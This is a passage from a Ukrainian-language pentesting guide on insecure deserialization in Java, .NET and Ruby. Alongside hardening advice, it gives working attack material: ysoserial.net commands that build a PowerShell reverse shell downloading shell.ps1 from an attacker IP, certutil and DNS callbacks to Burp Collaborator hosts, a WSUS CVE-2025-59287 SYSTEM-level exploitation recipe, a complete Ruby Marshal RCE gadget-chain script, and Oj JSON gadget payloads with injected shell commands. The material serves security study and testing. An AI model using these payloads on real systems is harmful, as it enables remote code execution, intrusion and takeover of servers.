Дізнайтеся більше про цю Java JSON бібліотеку: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Лабораторні вправи

- Якщо ви хочете протестувати деякі ysoserial payloads, ви можете **запустити цей webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Чому

Java широко використовує серіалізацію для різних цілей, таких як:

- **HTTP requests**: Серіалізація широко застосовується при обробці параметрів, ViewState, cookies тощо.
- **RMI (Remote Method Invocation)**: Протокол Java RMI, який повністю покладається на серіалізацію, є ключовим для віддаленої комунікації в Java-додатках.
- **RMI over HTTP**: Цей метод часто використовується в Java-застосунках з товстим клієнтом (thick client), використовуючи серіалізацію для всього обміну об'єктами.
- **JMX (Java Management Extensions)**: JMX використовує серіалізацію для передачі об'єктів по мережі.
- **Custom Protocols**: У Java стандартною практикою є передача сирих Java-об'єктів, що буде продемонстровано в наступних exploit examples.

### Запобігання

#### Transient objects

Клас, який реалізує `Serializable`, може позначити як `transient` будь-який об'єкт всередині класу, який не повинен бути серіалізований. Наприклад:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Запобігання серіалізації класу, який повинен реалізовувати `Serializable`

У випадках, коли певні **об'єкти повинні реалізовувати інтерфейс `Serializable`** через ієрархію класів, існує ризик ненавмисної десеріалізації. Щоб запобігти цьому, зробіть ці об'єкти непідлягаючими десеріалізації, визначивши `final` метод `readObject()`, який завжди кидає виняток, як показано нижче:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Підвищення безпеки при deserialization в Java**

**Налаштування `java.io.ObjectInputStream`** — практичний підхід для захисту процесів deserialization. Цей метод підходить, коли:

- Код deserialization знаходиться під вашим контролем.
- Класи, очікувані для deserialization, відомі.

Перевизначте метод **`resolveClass()`**, щоб обмежити deserialization лише дозволеними класами. Це запобігає deserialization будь-якого класу, крім тих, які явно дозволені, наприклад у наступному прикладі, що обмежує deserialization лише класом `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** пропонує запасний варіант, коли модифікація коду неможлива. Цей метод в основному застосовується для **blacklisting harmful classes**, з використанням JVM-параметра:
```
-javaagent:name-of-agent.jar
```
Перегляньте приклад у [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

Це забезпечує можливість динамічно захищати десеріалізацію, що ідеально підходить для середовищ, де негайні зміни коду непрактичні.

**Реалізація фільтрів серіалізації**: Java 9 додала фільтри серіалізації через інтерфейс **`ObjectInputFilter`**, що надає потужний механізм для вказання критеріїв, яким повинні відповідати серіалізовані об'єкти перед десеріалізацією. Ці фільтри можна застосовувати глобально або для окремих потоків, забезпечуючи тонкий контроль над процесом десеріалізації.

Щоб використовувати фільтри серіалізації, ви можете встановити глобальний фільтр, що застосовується до всіх операцій десеріалізації, або налаштувати його динамічно для конкретних потоків. Наприклад:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Використання зовнішніх бібліотек для посилення безпеки**: Бібліотеки такі як **NotSoSerial**, **jdeserialize** та **Kryo** пропонують розширені можливості для контролю та моніторингу Java deserialization. Ці бібліотеки можуть забезпечити додаткові шари безпеки, наприклад whitelist/blacklist класів, аналіз серіалізованих об’єктів перед десеріалізацією та впровадження кастомних стратегій серіалізації.

- **NotSoSerial** перехоплює процеси десеріалізації, щоб запобігти виконанню недовіреного коду.
- **jdeserialize** дозволяє аналізувати серіалізовані Java-об’єкти без їх десеріалізації, що допомагає виявити потенційно шкідливий вміст.
- **Kryo** — альтернативний фреймворк серіалізації, який робить акцент на швидкості та ефективності, пропонуючи налаштовувані стратегії серіалізації, що можуть підвищити безпеку.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Дізнайтесь, що таке **JNDI Injection**, як його зловживати через RMI, CORBA & LDAP та як експлуатувати log4shell (і приклад цієї вразливості) на наступній сторінці:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

Отже, по суті існує багато сервісів, які використовують JMS небезпечним способом. Якщо у вас є **достатні привілеї** для відправки повідомлень цим сервісам (зазвичай потрібні валідні облікові дані), ви можете відправити **шкідливі серіалізовані об’єкти, які будуть десеріалізовані споживачем/підписником**.\
Це означає, що при такій експлуатації всі **клієнти, які будуть використовувати це повідомлення, можуть бути інфіковані**.

Потрібно пам’ятати, що навіть якщо сервіс вразливий (через небезпечну десеріалізацію вводу від користувача), вам все одно потрібно знайти валідні gadgets для експлуатації вразливості.

Інструмент [JMET](https://github.com/matthiaskaiser/jmet) був створений, щоб **підключатися та атакувати ці сервіси, відправляючи декілька шкідливих серіалізованих об’єктів з використанням відомих gadgets**. Ці експлойти будуть працювати, якщо сервіс все ще вразливий і якщо будь-який з використаних gadgets присутній у вразливому застосунку.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

У контексті .Net експлойти через десеріалізацію працюють подібно до тих, що зустрічаються в Java, коли gadgets використовуються для виконання певного коду під час десеріалізації об’єкта.

### Fingerprint

#### WhiteBox

Потрібно проінспектувати вихідний код на наявність:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Фокус має бути на серіалізаторах, які дозволяють визначати тип через змінну під контролем користувача.

#### BlackBox

Пошук має бути спрямований на Base64-кодований рядок **AAEAAAD/////** або будь-який подібний патерн, який може бути десеріалізований на сервері, що дає контроль над типом, який буде десеріалізовано. Це може включати, але не обмежується, **JSON** або **XML** структурами з `TypeObject` або `$type`.

### ysoserial.net

У цьому випадку можна використовувати інструмент [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) для **створення експлойтів десеріалізації**. Після завантаження репозиторію git ви повинні **скомпілювати інструмент** за допомогою Visual Studio, наприклад.

Якщо ви хочете дізнатися, **як ysoserial.net створює свій експлойт**, ви можете [**check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Основні опції **ysoserial.net**: **`--gadget`**, **`--formatter`**, **`--output`** та **`--plugin`.**

- **`--gadget`** — використовується для вказівки gadget, який буде зловживатися (вказати клас/функцію, що буде використана під час десеріалізації для виконання команд).
- **`--formatter`** — вказує метод серіалізації експлойту (потрібно знати, яку бібліотеку використовує бекенд для десеріалізації і використовувати ту ж саму для серіалізації).
- **`--output`** — вказує, чи ви хочете експлойт у вигляді **raw** або **base64**. _Зверніть увагу, що **ysoserial.net** буде **кодувати** payload з використанням **UTF-16LE** (кодування за замовчуванням в Windows), тому якщо ви отримаєте raw і просто закодуєте його з Linux-консолі, можуть виникнути **проблеми сумісності кодувань**, які завадять експлойту працювати правильно (в HTB JSON box payload працював як у UTF-16LE, так і в ASCII, але це не означає, що так буде завжди)._
- **`--plugin`** — ysoserial.net підтримує плагіни для створення **експлойтів для специфічних фреймворків**, таких як ViewState

#### More ysoserial.net parameters

- `--minify` надасть **менший payload** (якщо це можливо)
- `--raf -f Json.Net -c "anything"` Це вкаже всі gadgets, які можуть бути використані з вказаним formatter (`Json.Net` у цьому випадку)
- `--sf xml` можна **вказати gadget** (`-g`) і ysoserial.net шукатиме formatter-и, що містять "xml" (без врахування регістру)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** також має **дуже цікавий параметр**, який допомагає краще зрозуміти, як працює кожен exploit: `--test`\
Якщо вказати цей параметр, **ysoserial.net** **спробує** **exploit** локально, тож ви зможете перевірити, чи ваш payload працюватиме правильно.\
Цей параметр корисний, тому що, якщо переглянути код, ви знайдете фрагменти коду на кшталт наступного (з [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Це означає, що щоб протестувати exploit, код викличе [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
У **попередньому коді є вразливість до створеного exploit**. Тому, якщо ви знайдете щось подібне у .Net додатку, це, ймовірно, означає, що той додаток також вразливий.\
Отже, параметр **`--test`** дозволяє зрозуміти **які частини коду вразливі** до desrialization exploit, який може створити **ysoserial.net**.

### ViewState

Перегляньте [цей POST про **як спробувати exploit параметр \_\_ViewState у .Net**](exploiting-__viewstate-parameter.md) щоб **виконати довільний код.** Якщо ви **вже знаєте секрети**, які використовує машина жертви, [**прочитайте цей пост, щоб дізнатися, як виконати код**](exploiting-__viewstate-knowing-the-secret.md)**.**

### Реальний sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Affected endpoints:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie дешифрується, а потім десеріалізується за допомогою BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch та пов'язані SOAP операції, що доходять до SoapFormatter sink'ів; base64 gadget обробляється, коли консоль WSUS отримує подію.
- Root cause: байти під контролем атакуючого потрапляють у застарілі .NET formatters (BinaryFormatter/SoapFormatter) без суворих allow‑lists/binders, тож gadget chains виконуються як обліковий запис сервісу WSUS (зазвичай SYSTEM).

Мінімальна експлуатація (Reporting path):
1) Згенеруйте .NET gadget за допомогою ysoserial.net (BinaryFormatter або SoapFormatter) і виведіть base64, наприклад:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Сформуйте SOAP для `ReportEventBatch`, вбудувавши base64 gadget, і POST його на `/ReportingWebService.asmx`.  
3) Коли адміністратор відкриває консоль WSUS, подія десеріалізується і gadget спрацьовує (RCE як SYSTEM).

AuthorizationCookie / GetCookie()
- Підроблений AuthorizationCookie може бути прийнятий, розшифрований і переданий у BinaryFormatter sink, що дозволяє pre‑auth RCE, якщо до нього можна дістатися.

Параметри публічного PoC (tecxx/CVE-2025-59287-WSUS):
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
See [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Запобігання

Щоб знизити ризики, пов'язані з десеріалізацією в .Net:

- **Уникайте дозволяти потокам даних визначати типи об'єктів.** Використовуйте `DataContractSerializer` або `XmlSerializer`, коли це можливо.
- **Для `JSON.Net`, встановіть `TypeNameHandling` у `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Уникайте використання `JavaScriptSerializer` з `JavaScriptTypeResolver`.**
- **Обмежте типи, які можуть десеріалізовуватись**, розуміючи вбудовані ризики .Net типів, таких як `System.IO.FileInfo`, які можуть змінювати властивості файлів на сервері, потенційно призводячи до атак відмови в обслуговуванні (DoS).
- **Будьте обережні з типами, що мають ризиковані властивості**, наприклад `System.ComponentModel.DataAnnotations.ValidationException` з властивістю `Value`, яку можна експлуатувати.
- **Надійно контролюйте інстанціювання типів**, щоб уникнути можливості для атакуючих впливати на процес десеріалізації — інакше навіть `DataContractSerializer` або `XmlSerializer` можуть стати вразливими.
- **Реалізуйте контроль білого списку** за допомогою користувацького `SerializationBinder` для `BinaryFormatter` та `JSON.Net`.
- **Будьте поінформовані про відомі insecure deserialization gadgets** у .Net і переконайтеся, що десеріалізатори не інстанціюють такі типи.
- **Ізолюйте потенційно ризиковий код** від коду з доступом до інтернету, щоб уникнути експонування відомих gadget'ів, таких як `System.Windows.Data.ObjectDataProvider` у WPF-додатках, ненадійним джерелам даних.

### **References**

- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

У Ruby серіалізація реалізується двома методами з бібліотеки **marshal**. Перший метод, відомий як **dump**, використовується для перетворення об'єкта в байтовий потік — цей процес називають серіалізацією. Натомість другий метод, **load**, застосовується для відтворення байтового потоку назад в об'єкт — процес, відомий як десеріалізація.

Для захисту серіалізованих об'єктів **Ruby використовує HMAC (Hash-Based Message Authentication Code)**, що забезпечує цілісність та автентичність даних. Ключ, який використовується для цього, зберігається в одному з таких місць:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (детальніше:** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Інший ланцюжок RCE для експлуатації Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() метод

Як пояснено в [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), якщо неочищений вхід від користувача потрапляє в метод `.send()` об'єкта ruby, цей метод дозволяє **викликати будь-який інший метод** об'єкта з будь-якими параметрами.

Наприклад, виклик eval із кодом Ruby як другим параметром дозволить виконати довільний код:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Крім того, якщо лише один параметр **`.send()`** контролюється атакуючим, як згадано в попередньому writeup, можливо викликати будь-який метод об'єкта, який **не потребує аргументів** або аргументи якого мають **значення за замовчуванням**.\
Для цього можна перебрати всі методи об'єкта, щоб **знайти деякі цікаві методи, що відповідають цим вимогам**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby забруднення класу

Дізнайтеся, як можна [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json забруднення

Якщо в тілі запиту відправити деякі значення, що не є hashable (наприклад масив), вони будуть додані в новий ключ `_json`. Однак нападник також може вказати в тілі значення з назвою `_json` з будь-якими довільними даними. Якщо, наприклад, backend перевіряє достовірність параметра, але потім також використовує параметр `_json` для виконання якоїсь дії, це може призвести до обходу авторизації.

Детальніше див. на [Ruby _json pollution page](ruby-_json-pollution.md).

### Інші бібліотеки

Ця техніка була взята[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Існують й інші Ruby бібліотеки, які можуть використовуватися для серіалізації об'єктів і, відповідно, можуть бути зловживані для отримання RCE при небезпечній десеріалізації. Нижче наведена таблиця показує деякі з цих бібліотек та метод, який викликається у завантаженому класі під час його десеріалізації (функція, яку можна зловживати для отримання RCE):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Бібліотека</strong></td><td><strong>Вхідні дані</strong></td><td><strong>Метод запуску в класі</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Базовий приклад:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
У випадку спроб зловживати Oj вдалося знайти gadget class, який всередині своєї функції `hash` викликає `to_s`, що викликає `spec`, що викликає `fetch_path`, який можна змусити отримувати випадковий URL, що робило його чудовим детектором таких неперевірених deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Крім того, виявлено, що за допомогою попередньої техніки в системі також створюється папка, яка необхідна для зловживання іншим gadget, щоб перетворити це на повний RCE за допомогою чогось на кшталт:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Кешування Bootstrap

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

Функціонал завантаження файлів у Rails-додатку дозволяє атакуючому довільно записувати файли. Хоча додаток запускається з обмеженнями (лише певні директорії, наприклад tmp, доступні для запису через Docker’s non-root user), це все ще дозволяє записувати в Bootsnap cache directory (зазвичай під tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap speeds up Rails boot times by caching compiled Ruby code, YAML, and JSON files. It stores cache files that include a cache key header (with fields like Ruby version, file size, mtime, compile options, etc.) followed by the compiled code. This header is used to validate the cache during app startup.

- Gather File Metadata

Атакуючий спочатку обирає цільовий файл, який ймовірно буде завантажений під час старту Rails (наприклад, set.rb зі стандартної бібліотеки Ruby). Виконуючи Ruby-код всередині контейнера, вони витягують критичні метадані (такі як RUBY_VERSION, RUBY_REVISION, size, mtime, і compile_option). Ці дані необхідні для створення валідного cache key.

- Compute the Cache File Path

Повторивши механізм хешування FNV-1a 64-bit від Bootsnap, визначається правильний шлях до cache файлу. Цей крок гарантує, що шкідливий cache файл буде розміщений саме там, де Bootsnap очікує його (наприклад, під tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

Атакуючий готує payload, який:

- Виконує arbitrary commands (наприклад, запуск id для показу інформації про процес).
- Видаляє malicious cache після виконання, щоб запобігти рекурсивній експлуатації.
- Завантажує оригінальний файл (наприклад, set.rb), щоб уникнути аварії додатку.

Цей payload компілюється в бінарний Ruby-код і конкатенується з ретельно сформованим cache key header (використовуючи попередньо зібрані метадані та правильний номер версії для Bootsnap).

- Overwrite and Trigger Execution

Using the arbitrary file write vulnerability, the attacker writes the crafted cache file to the computed location. Next, they trigger a server restart (by writing to tmp/restart.txt, which is monitored by Puma). During restart, when Rails requires the targeted file, the malicious cache file is loaded, resulting in remote code execution (RCE).



### Ruby Marshal exploitation in practice (updated)

Treat any path where untrusted bytes reach `Marshal.load`/`marshal_load` as an RCE sink. Marshal reconstructs arbitrary object graphs and triggers library/gem callbacks during materialization.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Поширені класи gadget, що зустрічаються в реальних ланцюжках: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Типовий маркер побічного ефекту, вбудований у payloads (виконується під час unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Де це проявляється в реальних додатках:
- Rails cache stores та session stores, які історично використовують Marshal
- Бекенди для background jobs та file-backed object stores
- Будь-яка кастомна персистентність або транспортування бінарних blob-об'єктів

Індустріалізоване виявлення gadget-ланцюгів:
- Grep по конструкторах, `hash`, `_load`, `init_with`, або методах із побічними ефектами, що викликаються під час unmarshal
- Використовуйте CodeQL’s Ruby unsafe deserialization queries для трасування sources → sinks та виявлення gadgets
- Валідуйте за допомогою публічних мультиформатних PoCs (JSON/XML/YAML/Marshal)


## Посилання

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
